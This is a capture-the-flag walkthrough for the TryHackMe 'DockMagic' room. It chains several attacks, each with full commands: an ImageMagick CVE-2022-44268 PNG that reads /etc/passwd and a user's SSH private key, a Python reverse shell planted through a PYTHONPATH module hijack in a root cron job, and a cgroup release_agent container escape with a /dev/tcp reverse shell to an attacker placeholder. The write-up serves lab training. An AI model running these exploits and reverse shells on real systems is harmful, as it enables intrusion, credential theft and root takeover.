# [DockMagic](https://tryhackme.com/room/dockmagic)

## In a land of magic, a wizard escaped from his confinement and embarks on a new adventure.

# Mystique

## See if you can uncover the secrets hidden with the mystical things you create.

### What is the value of flag 1?

1. Start with an initial reconnaissance scan to enumerate open ports and running services on the target machine.

```bash
nmap -sVC <TARGET_IP>
```

**Results:**

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
| ssh-hostkey:
|   3072 e6:b7:14:81:2d:c6:43:bd:f7:8e:ee:b3:7e:32:d3:09 (RSA)
|   256 7d:64:9d:6c:8d:24:9d:53:b4:7a:ac:c8:f9:da:8b:74 (ECDSA)
|_  256 d1:30:1a:39:c6:46:9a:47:91:12:c6:4d:0d:b9:4e:26 (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://site.empman.thm/
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

2. The nmap scan reveals that the web server immediately redirects to `http://site.empman.thm/`. Add the target IP along with the known virtual hostnames to `/etc/hosts` so they resolve locally:

```bash
echo "<TARGET_IP> empman.thm site.empman.thm" >> /etc/hosts
```

3. Enumerate additional subdomains by fuzzing the `Host` header with `ffuf`:

```bash
ffuf -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -u http://empman.thm -H "Host: FUZZ.empman.thm"
```

**Results**

```
backup                  [Status: 200, Size: 255, Words: 56, Lines: 8, Duration: 156ms]
site                    [Status: 200, Size: 4611, Words: 839, Lines: 97, Duration: 55ms]
```

4. A `backup` subdomain was discovered. Add it to `hosts` and navigate to `http://backup.empman.thm`:

5. `http://backup.empman.thm` exposes a downloadable archive `ImageMagic.zip`. Download and extract it to inspect its contents:

6. The archive contains two noteworthy files that reveal the application's technology stack and its known issues:

**TODO**

```
1. Implement Basic Authentication with avatar support (use MiniMagick for Image Processing ) - DONE
2. Implement a temporary Front page with some dummy content. - DONE
3. Implement minimum viable product. - IN PROGRESS

serious (TO BE DONE):
1. Revoke user's ssh keys.
2. Switch from minimagick to vips due to recent discovery of security vulnerabilities in ImageMagick.
```

**Install-unix.txt**

```
$magick> cd ImageMagick-7.0.9
$magick> ./configure
```

> The TODO file confirms the application processes user-uploaded avatars using **MiniMagick**, a Ruby wrapper around **ImageMagick 7.0.9**. The note to "switch from minimagick to vips due to recent discovery of security vulnerabilities in ImageMagick" is a direct hint toward **CVE-2022-44268** an ImageMagick arbitrary file read vulnerability. When ImageMagick processes a PNG that contains a `tEXt` chunk with the keyword `profile`, it reads the file at the specified path and embeds its raw contents inside the output image. Crucially, the TODO also states that SSH keys have **not** been revoked yet.

7. Craft a malicious PNG that exploits CVE-2022-44268. Use `pngcrush` to inject a `tEXt` chunk with the keyword `profile` and the value set to `passwd`. When the server processes this PNG with ImageMagick, it will read the target file and embed its hex-encoded contents as a raw profile inside the resulting image:

```bash
pngcrush -text a "profile" "/etc/passwd" input.png exploit.png
```

8. Register a new account at `http://site.empman.thm/users/sign_up` and upload `exploit.png` as your profile avatar. The server processes the upload with ImageMagick, reading `passwd` and embedding its contents in the stored avatar.

9. After the avatar is set, download your profile picture from the application. Run `identify` with the `-verbose` flag to inspect all embedded metadata. The file contents appear as a hex string in the `Raw profile type:` section. Copy that hex string to a file (e.g., `output.hex`):

```bash
identify -verbose avatar.png
```

10. Decode the hex-encoded data using `xxd` to reveal the file in plaintext:

```bash
xxd -r -p output
```

**Results:**

```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-network:x:101:103:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
systemd-timesync:x:104:107:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
Debian-exim:x:105:108::/var/spool/exim4:/usr/sbin/nologin
sshd:x:106:65534::/run/sshd:/usr/sbin/nologin
emp:x:1000:1000::/home/emp:/bin/bash
```

> The only non-system interactive user is `emp`, confirming the username we need to target. As the TODO noted, SSH keys have not been revoked.

11. Repeat the exploit, this time targeting the private SSH key of the `emp` user:

```bash
pngcrush -text a "profile" "/home/emp/.ssh/id_rsa" input.png exploit.png
```

Upload the new image as your avatar, download it, extract the raw profile hex from `identify -verbose`, and decode it with `xxd`.

12. Save the decoded private key to a local file named `id_rsa`.

13. Set the correct permissions on the key file and use it to connect via SSH:

```bash
chmod 600 id_rsa
ssh -i id_rsa emp@<TARGET_IP>
```

14. Retrieve the first flag from the `emp` home directory:

```bash
cat flag1.txt
```

[SCREEN01]

---

### What is the value of flag 2?

1. Inspect the system-wide crontab to identify any scheduled tasks:

```bash
cat /etc/crontab
```

**Results:**

```
* * * * * root PYTHONPATH=/dev/shm:$PYTHONPATH python3 /usr/local/sbin/backup.py >> /var/log/cron.log
```

> A cron job runs **every minute as `root`**, executing `/usr/local/sbin/backup.py`. Critically, the `PYTHONPATH` environment variable prepends `shm` to the module search path. Python resolves imports by scanning directories in `PYTHONPATH` in order, so `shm` is checked **before** any standard library location.

2. Read the backup script to identify which custom module it imports:

```bash
cat /usr/local/sbin/backup.py
```

**Results:**

```py
#custom backup script (to be created)
import cbackup
import time

# Start backup process
cbackup.init('/home/emp/app')
# log completion time
t=time.localtime()
current_time = time.strftime("%H:%M:%s", t)
print(current_time)
```

> The script imports a non-standard module named `cbackup` and calls `cbackup.init()`. Since `cbackup` does not exist as a system module, Python will search the `PYTHONPATH` directories. The `emp` user has write access to `shm`, so we can plant a malicious `cbackup.py` there. When the cron job fires, Python will import our file instead and execute our payload as `root`.

3. Set up a Netcat listener on the attacking machine to catch the incoming reverse shell:

```bash
nc -lvnp 4444
```

4. Write a malicious `cbackup.py` into `shm`. The module-level code executes immediately upon import, establishing a reverse shell before the `init()` call is ever reached:

```bash
echo -e "import socket,os,pty\nRHOST=\"<ATTACKER_IP>\"\nRPORT=4444\ns=socket.socket()\ns.connect((RHOST,RPORT))\n[os.dup2(s.fileno(),fd) for fd in (0,1,2)]\npty.spawn(\"/bin/sh\")" > /dev/shm/cbackup.py
```

5. Once the root shell arrives on the listener, retrieve the second flag:

```bash
cat /root/flag2.txt
```

[SCREEN02]

---

### What is the value of flag 3?

1. Mount the `rdma` cgroup subsystem and create a child cgroup named `x`. Enable `notify_on_release` on it. This mechanism causes the kernel to execute the path stored in `release_agent` whenever the last process in the cgroup exits:

```bash
mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x
echo 1 > /tmp/cgrp/x/notify_on_release
```

2. Determine the host filesystem path that maps to the container's root directory. The overlay mount entry in `mtab` exposes the `upperdir` path on the host:

```bash
host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
```

3. Point the `release_agent` to a shell script at the resolved host path. When the cgroup empties, the **host kernel** will execute this file as root:

```bash
echo "$host_path/cmd" > /tmp/cgrp/release_agent
```

4. Create the payload shell script at `/cmd` inside the container. It sends a reverse shell back to the attacker:

```bash
echo '#!/bin/bash' > /cmd
echo "/bin/bash -i >& /dev/tcp/<ATTACKER_IP>/4445  0>&1" >> /cmd
chmod a+x /cmd
```

5. Set up a second Netcat listener on port `4445` to catch the host-level root shell:

```bash
nc -lvnp 4445
```

6. Trigger the release agent by spawning a subprocess inside the child cgroup. Writing the current shell's PID to `cgroup.procs` places the process in `x`; when that shell exits, the kernel fires the `release_agent` on the **host** as `root`:

```bash
sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
```

7. Once the host-level root shell connects to the listener, retrieve the final flag:

```bash
cat /home/vagrant/flag3.txt
```
